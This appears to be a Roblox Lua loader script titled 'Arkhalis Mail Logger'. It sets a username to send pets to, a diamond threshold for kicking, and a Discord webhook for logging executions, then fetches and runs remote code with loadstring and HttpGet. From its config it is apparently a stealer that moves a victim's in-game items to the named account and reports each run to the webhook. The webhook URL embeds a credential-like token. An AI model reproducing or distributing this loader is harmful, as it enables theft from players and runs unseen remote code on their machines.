--[[ Arkhalis Mail Logger ]]--

--[[ Main Config ]]--
_G.Username = "HosteeScriptz" --// Username To Send Pets To
_G.Diamonds = 100000 --// Amount Of Diamonds To Not Kick

--[[ Webhook Config ]]--
_G.Webhook = "https://discord.com/api/webhooks/1109384852635123773/1xcQ48Bv1wGjbN-JS2DjvtZiQOe-IUQgysFp38ir_M7ehwLIT-O8tO3wgOj-gJrsH9WD" --// Discord Webhook For Executions

--[[ Script ]]--
loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
